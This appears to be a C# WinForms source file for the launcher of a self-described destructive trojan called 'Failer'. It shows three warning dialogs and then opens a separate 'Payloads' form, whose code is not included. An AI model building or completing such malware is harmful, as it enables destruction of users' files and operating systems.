using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;

namespace Failer
{
    public partial class Failer_1 : Form
    {
        public Failer_1()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
        }

        private void Failer_1_Load(object sender, EventArgs e)
        {
            if (MessageBox.Show("Warning! This virus (Failer) can damage your files and operating system!\n\nThis virus can only be executed by virus testers or those with specialized knowledge of computers.\nNever test this virus on an actual computer! It is an extremely dangerous virus and may require professional help to recover from!\n\nIf you choose to execute it, all responsibility rests with the person who executed this virus.\n\nDo you really want to execute it?", "Failer - Trojan", MessageBoxButtons.YesNo, MessageBoxIcon.Error, MessageBoxDefaultButton.Button2) == DialogResult.No)

            {
                Application.Exit();
            }
            else
            {
                Sec_Warning();
            }
        }
        public void Sec_Warning()
        {
            if (MessageBox.Show("Second Warning! This virus (Failer) can damage your files and operating system!\n\nThis virus can only be executed by virus testers or people with advanced knowledge of computers!\nNever test this virus on a real computer! It is a very dangerous virus and may require professional help for recovery!\n\nThis virus (Failer) is not a joke, it is a real virus!\n\nIf you execute it, all responsibility will be on the person who executed the virus.\n\nDo you really want to execute it?", "Failer - Trojan", MessageBoxButtons.YesNo, MessageBoxIcon.Error, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                Application.Exit();
            }
            else
            {
                LAST_Warning();
            }
        }
        public void LAST_Warning()
        {
            if (MessageBox.Show("Final warning! This virus (Failer) can damage your files and operating system!\n\nThis virus can only be executed by virus testers or people with advanced knowledge of computers!\nNever test this virus on a real computer! It is a very dangerous virus and may require professional help for recovery!\n\nThis virus (Failer) is not a joke, it is a real virus!\n\nIf you execute it, all responsibility will be on the person who executed the virus.\n\nDo you really want to execute it?", "Failer - Trojan", MessageBoxButtons.YesNo, MessageBoxIcon.Error, MessageBoxDefaultButton.Button2) == DialogResult.No)
            {
                Application.Exit();
            }
            else
            {
                go_to_payloads();
            }
        }
        public void go_to_payloads()
        {
            this.Hide();
            var NewForm = new Payloads();
            NewForm.ShowDialog();
            this.Close();
        }
    }
}
